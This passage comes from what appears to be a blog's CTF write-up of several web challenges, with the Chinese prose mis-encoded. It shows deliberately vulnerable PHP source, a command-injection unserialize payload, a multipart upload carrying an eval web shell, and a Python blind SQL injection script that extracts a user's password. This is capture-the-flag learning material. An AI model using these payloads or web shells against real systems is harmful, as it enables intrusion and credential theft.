punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ÂÆûÈôÖ‰∏äËÄÉÁöÑÊòØ<code>libcurl</code>and<code>parse_url()</code>Ëß£ÊûêÈóÆÈ¢ò„ÄÇ</p><p>ËøôÈáåÂèØ‰ª•ÂèÇËÄÉ<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">‰∏ÄÂè∂È£òÈõ∂Â∏àÂÇÖ</a>/)ÂÜôÁöÑ‰∏ÄÁØáÂçöÊñá„ÄÇ</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>Êâ´ÁõÆÂΩïÂæóswp‰∫§Êç¢Êñá‰ª∂==&gt;vimÊÅ¢Â§çÊñá‰ª∂==&gt;ÂæóÂà∞index.phpÊ∫êÁ†ÅÔºö</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÁÇπ‰∏∫ÂèçÂ∫èÂàóÂåñÁöÑÈóÆÈ¢òÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÊûÑÈÄ†getÂèÇÊï∞ÁªïËøáÂâçÈù¢ÁöÑÊ£ÄÊµãÔºåÊù•Âà∞postÂèÇÊï∞Â§Ñ„ÄÇ</p><p>ÊûÑÈÄ†getÂèÇÊï∞:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,ÈÄöËøáparse_strË¶ÜÁõñÂéüÊúâÂèòÈáèÂç≥ÂèØ„ÄÇ</p><p>ÁÑ∂ÂêéËøôÈ¢òÂπ∂‰∏çÊòØÁªïËøáwakeupÔºåÂõ†‰∏∫Âú®Êñ∞Áâàphp‰∏≠Â∑≤Áªè‰øÆÂ§çËøô‰∏™ÈóÆÈ¢òÔºåÊàë‰ª¨Ë¶ÅÂú®echo($host)Â§ÑÊ≥®ÂÖ•ÂëΩ‰ª§ÊâßË°åÔºåÊâÄ‰ª•ËøòÊòØÈúÄË¶ÅËßÑËßÑÁü©Áü©Âú∞ËøõË°åÁªïËøáËøáÊª§ÔºåÂ∞ÜÊûÑÈÄ†ÁöÑcome PostËøáÂéªÔºö</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØ‰∏çÁî®Á©∫Ê†ºÊâßË°åÂëΩ‰ª§Ôºà <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">ÂèÇËÄÉÈìæÊé• </a>ÔºâÔºå‰ª•ÂèäÂèçÂ∫èÂàóÂåñ‰∏≠ÁßÅÊúâÂèòÈáèÁöÑ%00ÈóÆÈ¢òÔºåÂ¶ÇÊûú‰∏ç‰ª•urlÁºñÁ†ÅÂΩ¢ÂºèÔºå%00Âπ∂‰∏ç‰ºöËµ∑‰ΩúÁî®„ÄÇ</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>ËôΩÁÑ∂Ê≤°ÂÅöÂá∫Êù•üò≠Ôºå‰ΩÜËøòÊòØË¶ÅÂ≠¶‰π†‰∏Ä‰∏ãÁöÑ„ÄÇ</p><p>ÂèàÊòØphpÁöÑ‰ª£Á†ÅÂÆ°ËÆ°È¢ò„ÄÇ</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>ËÄÉÂØü‰∏§‰∏™Áü•ËØÜÁÇπÔºå‰∏Ä‰∏™ÊòØÊï∞ÁªÑÁªïËøáÔºå‰ª•Âèäunlink  <del>php/.</del> ÁªïËøá„ÄÇ</p><p>ÊûÑÈÄ†Êï∞ÊçÆÂåÖÂ¶Ç‰∏ãÔºàÊú¨Âú∞Â§çÁé∞ÔºâÔºö</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>ÂÜçÈÄöËøáÈÅçÂéÜÊñá‰ª∂ÂêçÊãøÂà∞ÊùÉÈôêÔºågetflag„ÄÇ</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>Êó∂Èó¥Áõ≤Ê≥® + Êñá‰ª∂ÂêçÊãºÊé•  + ‰∏ä‰º†Êà™Êñ≠ÁªïËøáÔºå%02ÈªëËÑ∏Êà™Êñ≠üòÑ„ÄÇ</p><p>ÊûÑÈÄ†Âá∫payloadÂêéÂèØ‰ª•Áõ¥Êé•ÊãøÁªôsqlmapË∑ëÔºüÁ•ûÂô®ÔºàÊúâÊó∂Èó¥ÂÜçÊ∑±ÂÖ•Á†îÁ©∂‰∏Ä‰∏ãÔºâ„ÄÇ‰πüÂèØ‰ª•Ëá™Â∑±ÂÜôËÑöÊú¨Ë∑ëÔºå‰æãÂ¶Ç‰∏ãÈù¢Â∞±ÊòØÊàëËÆ§‰∏∫‰∏Ä‰∏™ÂÜôÁöÑÊØîËæÉÁÆÄÂçïÊòìÁî®ÁöÑËÑöÊú¨Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#ÈáçÁî®ÊÄßÈ´òÁöÑ‰ª£Á†ÅÊòØÂ•Ω‰ª£Á†Å</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Ë∑ëflagÂç≥ÂèØ„ÄÇ</p><p>emmm‰ª•‰∏äÊòØÁõ≤Ê≥®ÁöÑÊñπÊ≥ïÔºåÈÇ£‰πà‰∏ãÈù¢ËøòÊúâÈÄöËøáfuzzÂæóÂà∞ËøáÊª§ÂÖ≥ÈîÆÂ≠óÔºåÁÑ∂ÂêéÁªïËøáÁõ¥Êé•Ê≥®ÁöÑÔºåÂõ†‰∏∫ËøôÊòØÊúâÂõûÊòæÁöÑ‰∏Ä‰∏™Ê≥®ÂÖ•Âòõ„ÄÇ</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>ÊÄª‰πãÊñπÊ≥ïÊÄªÊòØÂ§öÁßçÂ§öÊ†∑ÁöÑ„ÄÇ</p></blockquote><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><blockquote><p>Ëá≥‰∫é‰∫åËøõÂà∂ÔºåËøòÂú®Â≠¶‰π†‰πã‰∏≠ÔºåÂØÜÁ†ÅÂ≠¶ÁöÑRSA,ÂíåAES‰πüÈúÄË¶ÅÊäΩ‰∏™Êó∂Èó¥Êù•Ê∑±ÂÖ•Á†îÁ©∂‰∏Ä‰∏ã„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁΩëÁªúÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ÁΩëÁªúÂÆâÂÖ® </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ÊâìÈÄ†‰∏Ä‰∏™ÈõÜwebÂíåpwn‰∫é‰∏Ä‰ΩìÁöÑAWD_docker</title>
      <link href="/2018/11/03/AWD-docker/"/>
      <url>/2018/11/03/AWD-docker/</url>
      
